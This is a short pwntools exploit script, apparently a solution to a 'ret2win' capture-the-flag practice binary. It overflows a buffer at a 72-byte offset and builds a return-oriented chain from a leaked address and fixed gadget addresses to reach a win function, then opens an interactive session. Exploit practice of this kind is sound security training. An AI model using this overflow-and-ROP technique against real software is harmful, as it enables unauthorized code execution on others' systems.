#!/usr/bin/python3
from pwn import *

# Switch between local/GDB/remote from terminal 
def initIO():
    if (args.REMOTE):   # ("server", port)
        return remote(sys.argv[1], sys.argv[2])
    else:               # Run locally
        return ELF.process()

# Set up the correct architecture for pwn
file = "./ret2win"
# Get context arch, bits, os, etc.
ELF = context.binary = ELF(file, checksec=False)
# Enable verbose logging
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = initIO()

offset = 72

io.recvuntil("0x")
leak = io.recv(6)
leak = int(leak, 16)

change_permission = int(0x401205)
go_home = int(0x40123b)

pop_rdi = int(0x00000000004011fe)

payload = flat(
    offset * b'A',
    change_permission,
    pop_rdi,
    leak,
    go_home,
)

print(payload)

io.sendline(payload)

io.interactive()
